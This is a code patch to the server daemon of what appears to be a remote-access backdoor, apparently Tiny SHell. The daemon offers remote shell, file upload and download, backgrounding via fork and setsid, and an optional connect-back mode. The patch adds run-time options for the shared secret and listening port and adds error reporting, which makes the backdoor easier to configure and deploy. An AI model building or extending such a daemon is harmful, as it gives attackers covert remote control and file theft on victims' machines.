@@ -43,6 +43,8 @@
 #include "pel.h"
 
 unsigned char message[BUFSIZE + 1];
+extern char *optarg;
+extern int optind;
 
 /* function declaration */
 
@@ -50,11 +52,21 @@ int tshd_get_file( int client );
 int tshd_put_file( int client );
 int tshd_runshell( int client );
 
+void usage(char *argv0)
+{
+    fprintf(stderr, "Usage: %s [ -s secret ] [ -p port ]\n", argv0);
+    exit(1);
+}
+
+
 /* program entry point */
 
-int main( void )
+
+int main( int argc, char **argv )
 {
-    int ret, len, pid, n;
+    int ret, len, pid;
+    socklen_t n;
+    int opt;
 
 #ifndef CONNECT_BACK_HOST
 
@@ -69,6 +81,22 @@ int main( void )
     struct hostent *client_host;
 
 #endif
+
+    while ((opt = getopt(argc, argv, "s:p:")) != -1) {
+        switch (opt) {
+            case 'p':
+                server_port=atoi(optarg); /* We hope ... */
+                if (!server_port) usage(*argv);
+                break;
+            case 's':
+                secret=optarg; /* We hope ... */
+                break;
+            default: /* '?' */
+                usage(*argv);
+                break;
+        }
+    }
+
 
     /* fork into background */
 
@@ -88,6 +116,7 @@ int main( void )
 
     if( setsid() < 0 )
     {
+        perror("socket");
         return( 2 );
     }
 
@@ -106,6 +135,7 @@ int main( void )
 
     if( server < 0 )
     {
+        perror("socket");
         return( 3 );
     }
 
@@ -118,11 +148,12 @@ int main( void )
 
     if( ret < 0 )
     {
+        perror("setsockopt");
         return( 4 );
     }
 
     server_addr.sin_family      = AF_INET;
-    server_addr.sin_port        = htons( SERVER_PORT );
+    server_addr.sin_port        = htons( server_port );
     server_addr.sin_addr.s_addr = INADDR_ANY;
 
     ret = bind( server, (struct sockaddr *) &server_addr,
@@ -130,11 +161,13 @@ int main( void )
 
     if( ret < 0 )
     {
+        perror("bind");
         return( 5 );
     }
 
     if( listen( server, 5 ) < 0 )
     {
+        perror("listen");
         return( 6 );
     }
 
@@ -149,6 +182,7 @@ int main( void )
 
         if( client < 0 )
         {
+            perror("accept");
             return( 7 );
         }
 
@@ -181,7 +215,7 @@ int main( void )
                 client_host->h_length );
 
         client_addr.sin_family = AF_INET;
-        client_addr.sin_port   = htons( SERVER_PORT );
+        client_addr.sin_port   = htons( server_port );
 
         /* try to connect back to the client */
 
